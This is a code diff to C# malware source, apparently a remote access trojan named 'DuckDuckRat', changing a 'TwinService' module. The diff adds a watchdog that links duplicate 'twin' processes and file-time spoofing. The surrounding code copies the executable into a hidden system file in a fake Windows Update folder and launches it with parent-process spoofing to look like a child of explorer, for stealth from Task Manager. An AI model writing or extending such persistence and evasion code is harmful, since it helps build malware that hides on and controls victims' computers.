@@ -2,9 +2,9 @@ using System;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
-using VanguardCore.Modules;
+using DuckDuckRat.Modules;
 
-namespace FinalBot.Modules
+namespace DuckDuckRat.Modules
 {
     public static class TwinService
     {
@@ -22,6 +22,19 @@ namespace FinalBot.Modules
         {
             try
             {
+                // [GHOST] Smart redundant check: avoid spawning multiple twins
+                foreach (var name in LEGIT_NAMES) {
+                    var existing = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(name));
+                    if (existing.Length > 0) {
+                        // Twin already active, just link monitoring if needed
+                        // (Usually the twin will find US, but we can also find it)
+                        foreach (var t in existing) {
+                             WatchdogManager.Start(t.Id, ""); // Path unknown but PID is enough for monitoring
+                             return; 
+                        }
+                    }
+                }
+
                 string selfPath = Process.GetCurrentProcess().MainModule.FileName;
                 string tempDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update");
                 if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);
@@ -37,6 +50,7 @@ namespace FinalBot.Modules
                 }
                 
                 File.Copy(selfPath, twinPath, true);
+                SafetyManager.CopyFileTime(twinPath);
                 
                 // Hide the file
                 File.SetAttributes(twinPath, FileAttributes.Hidden | FileAttributes.System);
@@ -47,7 +61,7 @@ namespace FinalBot.Modules
 
                 // PPID Spoofing for Task Manager Stealth
                 // Make it look like a child of explorer or svchost
-                bool success = VanguardCore.ElevationService.SpawnWithSpoof(twinPath, args, "explorer");
+                bool success = DuckDuckRat.ElevationService.SpawnWithSpoof(twinPath, args, "explorer");
                 
                 if (!success)
                 {
@@ -84,3 +98,5 @@ namespace FinalBot.Modules
         }
     }
 }
+
+
